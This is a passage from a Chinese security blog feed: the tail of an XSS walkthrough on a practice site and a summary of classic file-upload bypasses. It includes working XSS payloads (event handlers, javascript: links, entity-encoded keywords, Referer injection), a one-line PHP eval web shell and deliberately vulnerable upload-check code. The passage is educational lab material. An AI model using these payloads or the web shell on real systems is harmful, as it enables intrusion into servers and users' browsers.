value&#x3D;&quot;搜索&quot;&#x2F;&gt;<br>&lt;&#x2F;form&gt;<br></code></pre></td></tr></table></figure><p>  这里的keyword参数就是输入框的变量，我们输入的值会在替换value的值，也就是双引号里面的就是keyword变量代表的东西，所以我们闭合这个<code>&lt;input&gt;</code>标签用的是<code>&quot;&gt;</code>，后面就可以跟上ShellCode。放到界面输入框里就是</p><img src="/2021/05/09/XSS%E6%94%BB%E5%87%BB%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/level2.jpg" class="" title="XSS攻击通关之路"><p>  这个输入框太小，里面的内容有一小部分没显示出来ԅ(¯ㅂ¯ԅ)。。。。。POST型同理，这里就不举例了。</p></li><li><p>第三种就是过滤一些特殊字符：</p><img src="/2021/05/09/XSS%E6%94%BB%E5%87%BB%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/level3.jpg" class="" title="XSS攻击通关之路"><p>  上面就是通过源码看出的测试字符串，结果的源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;form action&#x3D;level3.php method&#x3D;GET&gt;<br>&lt;input name&#x3D;keyword  value&#x3D;&#39;&#39;&gt;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&#39;&gt;<br>&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;<br>&lt;&#x2F;form&gt;<br></code></pre></td></tr></table></figure><p>  可以看出输入的<code>&quot;</code>、<code>&lt;</code>和<code>&gt;</code>都被过滤了，所以带有尖括号的ShellCode就不能用了。所以在此换思路采用事件属性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//test.xss.tv/level3.php?keyword=&#x27;+onclick=&#x27;javascript:Aalert(/xss/)&#x27;&amp;submit=submit</span><br></code></pre></td></tr></table></figure><p>  同样的道理，先闭合前一个变量值，在放ShellCode，放到界面输入框就是</p><p>  在这里就要注意下，因为上面用的是<code>onclick</code>点击事件，所以还要点击一下输入框才会有弹窗。</p></li><li><p>第四种就是过滤关键字：</p><p>  一般测试的第一反应就是用最常见两中方式，发现特殊字符都被过滤了才会考虑用触发事件，但触发事件的关键字也被过滤了，这时候就要找有哪些还没有被过滤的。关键字测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">http:&#x2F;&#x2F;test.xss.tv&#x2F;level5.php?keyword&#x3D;&quot; ONclick&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)<br></code></pre></td></tr></table></figure><p>  源代码处可以看到得到的结果是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;form action&#x3D;level5.php method&#x3D;GET&gt;<br>&lt;input name&#x3D;keyword  value&#x3D;&quot;&quot; o_nclick&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;<br>&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;<br>&lt;&#x2F;form&gt;<br></code></pre></td></tr></table></figure><p>  很明显，<code>onclick</code>关键字中间被加了下划线，这种是用双关键字和大小写绕过不了的，那就换一种触发事件，这里可以先考虑超链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">http:&#x2F;&#x2F;test.xss.tv&#x2F;level5.php?keyword&#x3D;&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;点这里&lt;&#x2F;a&gt;&#x2F;&#x2F;<br></code></pre></td></tr></table></figure><p>  看到的结果就是</p><img src="/2021/05/09/XSS%E6%94%BB%E5%87%BB%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/level5.jpg" class="" title="XSS攻击通关之路"><p>  同样可以成功，后面加了个<code>//</code>的原因是为了注释掉后面多余的部分，以免影响代码的正确性。同样的道理，这一类型的常用利用方法有<code>onclick,onerror,</code>、<code>&lt;a&gt;标签、&lt;img&gt;标签、&lt;svg&gt;标签</code>、<code>双关键字、大小写</code>等不同的多种组合。</p></li><li><p>第五种就是HTML实体编码绕过</p><p>  HTML实体编码指的就是用unicode编码来代替关键字符或关键符号，它有一个很大的特点，那就是<code>&amp;</code>、<code>#</code>、<code>;</code>不能被过滤。具体使用举个例子就一目了然：假设关键字<code>JavaScript</code>被过滤成<code>JavaScrip_t</code>，那就可以用<code>JavaScript</code>来代替<code>JavaScript</code>，这里的括号可以用两个反单引号代替。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">http:&#x2F;&#x2F;test.xss.tv&#x2F;level8.php?keyword&#x3D;javascript:alert(1)<br></code></pre></td></tr></table></figure><p>  这里的关键字<code>javascript</code>被正则表达式加上了下划线：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;form action=level8.php method=GET&gt;<br>&lt;input name=keyword  value=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;center&gt;<br>&lt;a href=<span class="hljs-string">&quot;javascr_ipt:alert(1)&quot;</span>&gt;友情链接&lt;/a&gt;<br>&lt;img src=level8.jpg&gt;<br>&lt;/center&gt;<br></code></pre></td></tr></table></figure><p>  这个时候HTML实体编码就可以派上用场了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">http:&#x2F;&#x2F;test.xss.tv&#x2F;level8.php?keyword&#x3D;javascrip&amp;#x74;:alert(&#x2F;xss&#x2F;)&amp;submit&#x3D;%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5<br></code></pre></td></tr></table></figure><p>  这里的submit参数后面的一串URL编码代表的是添加友情链接，界面执行就是</p><img src="/2021/05/09/XSS%E6%94%BB%E5%87%BB%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/level8.jpg" class="" title="XSS攻击通关之路"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;form action=level8.php method=GET&gt;<br>&lt;input name=keyword  value=<span class="hljs-string">&quot;javascrip&amp;amp;#x74;:alert(/xss/)&quot;</span>&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;center&gt;<br>    &lt;a href=<span class="hljs-string">&quot;javascrip&amp;#x74;:alert(/xss/)&quot;</span>&gt;友情链接&lt;/a&gt;<br>&lt;/center&gt;<br>&lt;center&gt;<br>    &lt;img src=level8.jpg&gt;<br>&lt;/center&gt;<br></code></pre></td></tr></table></figure><p>  同样的道理，这里需要点击那个友情链接。可以看出，源码不会出现问题，这里的<code>t</code>使用HTML实体编码照样能够被解析成功。这就是HTML实体编码的强大之处，HTML可以识别，执行文件的正则匹配不会成功，从而达到一个绕过的效果。</p><p>  编码绕过的方式还有好多种，比如<code>十六进制编码</code>、<code>jsfuck编码</code>、<code>url编码</code>等，这里不做过多的举例。</p></li><li><p>第六种就是HTTP头流量包注入：</p><p>  这种就是在隐藏HTTP流量存在CSS漏洞的时候就可以抓包修改，流通ShellCode：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;form id&#x3D;search&gt;<br>&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&quot; type&#x3D;&quot;hidden&quot;&gt;<br>&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&quot; type&#x3D;&quot;hidden&quot;&gt;<br>&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&quot; type&#x3D;&quot;hidden&quot;&gt;<br>&lt;input name&#x3D;&quot;t_ref&quot;  value&#x3D;&quot;http:&#x2F;&#x2F;test.xss.tv&#x2F;level10.php?keyword&#x3D;well%20done!&amp;t_sort&#x3D;%22type&#x3D;%22text%22%20onclick%20&#x3D;%20%22alert(1)&quot; type&#x3D;&quot;hidden&quot;&gt;<br>&lt;&#x2F;form&gt;<br></code></pre></td></tr></table></figure><p>  可以看出，第四个隐藏的<code>&lt;input&gt;</code>标签里面流通的是<code>t_ref</code>，可以猜测，这个流量包是经过<code>Referer</code>的，所以对其进行抓包，修改Referer参数</p><img src="/2021/05/09/XSS%E6%94%BB%E5%87%BB%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/level11_1.jpg" class="" title="XSS攻击通关之路"><p>  可以看到，这里多出来了一个部分，因为使用的是<code>onmouseover</code>事件，所以只要鼠标经过触碰到，就会触发通过。同样的道理，还可以修改<code>User-Agent</code>、<code>Cookie</code>等一系列HTTP头参数，具体情况具体使用。</p></li></ol><p>  这里一直可以做到第十三关，第十四关好像崩了，进行不下去了。这样这次就做到这里了，以后找机会再往后进行吧，这一次消化的东西有点多了。如果记录的有什么不对，还请表哥表姐们点名批评，批评通道：</p><img src="/2021/05/09/XSS%E6%94%BB%E5%87%BB%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/QQ.png" class="" title="XSS攻击通关之路">]]></content>
    
    
    <categories>
      
      <category>常见漏洞基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>经典上传漏洞小结</title>
    <link href="/2021/05/09/%E7%BB%8F%E5%85%B8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
    <url>/2021/05/09/%E7%BB%8F%E5%85%B8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="经典上传漏洞小结"><a href="#经典上传漏洞小结" class="headerlink" title="经典上传漏洞小结"></a>经典上传漏洞小结</h1><p> Posted on 2019-03-15</p><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>  很久没回来跟新自己的博客了，这几天借着来郑州学习的时间，温习了一下几种常见的上传漏洞，也是时候给自己的博客增加点内容了，证明一下自己还活着～～～～～</p><h3 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h3><p>  首先在这里表达一下自己对上传漏洞的理解：见名思义，在某个能够上传文件的地方（下面就叫它为up点）上传一些恶意的木马，在hacker或受害者的触发下对受害服务器产生恶意干扰。最典型的就是hacker选择绕过WAF将一句话木马导入up点，获取进入被攻击服务器的后台，利用菜刀工具进入该服务器获取后台文件。</p><p>  一句话木马：<?php @eval($_POST[‘password’]);?>，该木马一般被hacker用作连接服务器后台的PHP文件内容，配合菜刀工具可以轻松进入服务器后台，所谓传小马，连webshell指的就是它。木马的<code>password</code>是个可选变量，是菜刀连接该木马的密码。</p><p>  一些常见的上传漏洞类型：</p><ol><li><h5 id="前端检测漏洞："><a href="#前端检测漏洞：" class="headerlink" title="前端检测漏洞："></a>前端检测漏洞：</h5><p>  主要指那些在前端代码部分使用特定方法过滤的类型，例如直接在html代码中使用<code>&lt;script&gt;&lt;/script&gt;</code>直接限制关键字，这里的关键字主要是文件后缀<code>.jpg、.png、.gif</code>等常见的无法解析内部恶意代码的文件。造成该漏洞的主要原因是程序员再编写代码的时候只是前端代码中限制可上传文件的后缀，换句话说只是在客户端浏览器上检测，这就造成了只要流量包通过客户端浏览器的检测，就会畅通无阻地上传到up点。代码举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;<br>function checkFile() &#123;<br>    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;<br>    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;<br>        alert(&quot;请选择要上传的文件!&quot;);<br>        return false;<br>    &#125;<br>    &#x2F;&#x2F;定义允许上传的文件类型<br>    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;<br>    &#x2F;&#x2F;提取上传文件的类型<br>    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));<br>    &#x2F;&#x2F;判断上传文件类型是否允许上传<br>    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;<br>        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;<br>        alert(errMsg);<br>        return false;<br>    &#125;<br>&#125;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure><p>  该代码里面有个明显的参数allow_ext，不难看出是用来记录可上传文件类型的后缀，并且使用<code>&lt;script&gt;</code>标签修饰。hacker就可以通过一些插件（比如火狐的firebug）对此类参数进行修改，添加一些可执行文件的后缀即可上传恶意文件，从而获取webshell。当然，有些hacker可能会通过抓包工具（比如BurpSute）抓取前端检测可通过的文件但含有恶意代码的文件，修改文件后缀后放包。</p></li><li><h5 id="服务端MIME类型漏洞："><a href="#服务端MIME类型漏洞：" class="headerlink" title="服务端MIME类型漏洞："></a>服务端MIME类型漏洞：</h5><p>  MIME简单说就是客户端上区分不同类型数据的软件，例如WEB浏览器判断文件类型时就是通过MIME类型来确定是jpg图片还是PostScript文件。一般图片的类型就是<code>imge/具体图片类型</code>（比如jpg图片的MIME类型就是<code>imge/jpeg</code>），这些类型会被记录在HTTP包的Conent-Type里面，然后上传到服务端PHP的$_FILES超全局变量里面。造成该漏洞的原因是服务端辨别文件的一种方式就是通过检测流通文件的MIME类型，程序员在开发网站的时候考虑到在客户端判断绕过类型容易被抓漏洞，所以选择在服务端使用从客户端传来的辨别文件的MIME类型来过滤文件。代码举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$is_upload &#x3D; false;<br>$msg &#x3D; null;<br>if (isset($_POST[&#39;submit&#39;])) &#123;<br>    if (file_exists($UPLOAD_ADDR)) &#123;<br>        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;<br>            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;<br>                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];<br>                $is_upload &#x3D; true;<br>            &#125;<br>        &#125; else &#123;<br>            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;<br>        &#125;<br>    &#125; else &#123;<br>        $msg &#x3D; $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;;<br>    &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>  在该代码中可以看出服务端利用客户端传来MIME类型值来确定文件类型，这种辨别方式存在一个明显的漏洞，就是服务端只是简单通过客户端给文件记录的标记（也就是上面说的MIME类型）来判断文件类型，这种标识符是可以被更改的。hacker一般会通过抓取客户端的流量包并修改文件的MIME类型，使之可以通过服务端的检测，就可以上传恶意木马。</p></li><li><h5 id="文件扩展名绕过漏洞："><a href="#文件扩展名绕过漏洞：" class="headerlink" title="文件扩展名绕过漏洞："></a>文件扩展名绕过漏洞：</h5><p>  这里的文件扩展名具体指的是服务端可解析的php文件多样，简单说来就是服务器可以解析的站点文件不只有<code>php</code>，还有<code>php2，php3，php4，php5</code>，带着些后缀的站点文件效果与php文件不相上下。造成这个漏洞的主要原因是程序员在开发的时候只是简单过滤了一些常见文件的后缀，而没有考虑到php文件的扩展名问题。代码举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$UPLOAD_ADDR</span>)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$UPLOAD_ADDR</span>. <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>                 <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> .<span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>  从代码中可以看出，被限制的文件扩展名只有<code>&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;</code>，所以，客户端在上传<code>php2，php3，php4，php5</code>等文件的时候是被允许的（这里的一些可绕过关键字太多，就一一举例），这就造成了一些恶意代码可被上传的可能，只要不触碰被禁止的扩展名，使用一些常见的方式（大小写，文件流，不被禁止的可解析文件等等）都可以上传恶意代码到up点，当然，一些hacker喜欢利用抓包工具看流量包更改后缀。</p></li><li><h5 id="文件内容检测上传漏洞："><a href="#文件内容检测上传漏洞：" class="headerlink" title="文件内容检测上传漏洞："></a>文件内容检测上传漏洞：</h5><p>  文件内容检测已经可以说是一种比较安全的检测方式，简单说，文件内容检测就是通过对上传文件解析后的2进制或16进制代码进行检测其内容是否合法或者是否存在恶意代码。例如png图片的开头一定是<code>89 50 4E 47 0d 0a 1a 0a</code>。但这种检测还会存在漏洞的原因就是这种判断方式太严格，只要能够满足站点文件的要求，就可能被某个可上传文件欺骗过去。代码举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span><br>    fclose(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    <br>    <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    <br>    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;        <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;<br>        &#125;    <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_type</span> = getReailFileType(<span class="hljs-variable">$temp_file</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> == <span class="hljs-string">&#x27;unknown&#x27;</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$UPLOAD_ADDR</span>.<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_type</span>;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传失败&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>  可以看出，文件在上传之后只被允许读入2字节，然后判断是否为被允许文件的前缀，而被允许的文件还会重新组成文件名后才会被读入。虽然说这样的检测确实繁琐点，当确实有一定的可靠性。但道高一尺，魔高一丈啊，hacker利用抓包工具将流量包截取下来，并且在文件末尾加上恶意木马，修改扩展名后放包，绕过随机函数的这一块大部分会采用匹配up点的文件名的脚本来确定自己上传上去的文件被修改成是什么名，这类脚本只要懂一些http流量截取的人基本上都会写出，这里就不放出了。这样就可以通过菜刀工具进入up点了。</p></li><li><h5 id="00截断目录绕过漏洞："><a href="#00截断目录绕过漏洞：" class="headerlink" title="%00截断目录绕过漏洞："></a>%00截断目录绕过漏洞：</h5><p>  谈到这个漏洞，我就想起当初在学习的时候遇到的坎坷，那时候我还不会这个类型的绕过，所以对这个绕过还是一直都是懵懵懂懂的状态，一直到前几天在做一道CTF时，突然感觉自己就悟了。我的感官中，这个漏洞已经超出那些只懂得编辑代码的程序员的能力范围。这个漏洞利用URL编码%00或者16进制下的0x00直接将后面的累赘代码省略掉，就就像c语言中在一段字符串中间加了一个不被转义的<code>\0</code>一样，提前结束了该字符串，这里也是同样的道理，程序在读URL代码中变量的时候，%00触发了<code>char(0)</code>这个字符，程序就会误判到了结束符，提前结束读取变量，这样就保留下了截断符前面的部分。代码举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$is_upload &#x3D; false;<br>$msg &#x3D; null;<br>if (isset($_POST[&#39;submit&#39;])) &#123;<br>    if (file_exists($UPLOAD_ADDR)) &#123;<br>        $deny_ext &#x3D; 